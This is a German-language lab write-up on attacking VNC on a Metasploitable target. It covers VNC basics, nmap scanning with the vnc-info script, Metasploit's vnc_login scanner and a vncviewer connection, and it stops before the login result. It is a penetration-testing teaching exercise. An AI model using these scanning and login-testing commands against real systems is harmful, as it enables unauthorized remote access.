## VNC Exploitation

### Übung (VNC - Recherche)

#### Angabe
Recherchiere Basics zu VNC (Virtual Network Computing).

#### Lösung 

##### VNC (Virtual Network Computing)

VNC (Virtual Network Computing) ermöglicht die Fernsteuerung eines Computers über ein Netzwerk. Ein VNC-Server läuft auf dem Zielcomputer, ein VNC-Client auf dem steuernden Gerät. Die Kommunikation erfolgt über das RFB-Protokoll.

Anwendungsbereiche: Fernwartung, Support, Homeoffice und Bildung.

Vorteile: plattformunabhängig, einfach einzurichten, mehrere Clients möglich.
Nachteile: langsamer als spezialisierte Software, standardmäßig unverschlüsselt.

Bekannte Varianten: RealVNC, TightVNC, UltraVNC.


### Übung( VNC - Scan)

#### Angabe

Scanne mit nmap den VNC Port auf Metasploitable. Teste Version und Banner. Verwende das nmap Script vnc-info.

#### Lösung

##### VNC-Port scannen

Scan des Standard-VNC-Ports 5900 mit nmap.

```bash
nmap -p 5900 <IP-Adresse>
```

Der Port ist offen und akzeptiert Verbindungen.

##### VNC-Dienst identifizieren

Ausführen des nmap-Skripts vnc-info zur Analyse des Dienstes.
```bash
nmap -p 5900 --script vnc-info <IP-Adresse>
```
Der Dienst meldet sich als VNC (Remote Framebuffer).

##### Version und Sicherheitsmechanismen auslesen

Das Skript liefert Informationen zur verwendeten RFB-Version (z. B. 003.003) sowie zu den unterstützten Authentifizierungsmechanismen.
Teilweise ist keine oder nur einfache VNC-Authentifizierung aktiv.

##### Ergebnis

Port 5900/tcp offen

Aktiver VNC-Dienst erkannt

Versions- und Bannerinformationen erfolgreich ausgelesen

Potenzielles Sicherheitsrisiko durch schwache oder fehlende Authentifizierung

### Übung (VNC - Exploit)

#### Angabe

Metasploitable enthält eine Schwachstelle im VNC Server.

In metasploit gibt es ein Modul unter auxiliary/scanner/vnc das auf Login Vulnerabilities testet. Verwende dieses Modul.
Anschließend liegen genug Informationen vor um eine VNC Verbindung von Kali auf Metasploitable aufzubauen (mit vncviewer). Als welcher User bist du nun eingeloggt?

#### Lösung 

##### MSf console
```bash
msfconsole
```

##### Vnc Login Scanner laden

```bash
use auxiliary/scanner/vnc/vnc_login
```

##### Zieladdresse setzen

```bash
set RHOSTS 192.168.1.51
```

#### Viewer nutzen

```bash
vncviewer 192.168.1.51:5900
```
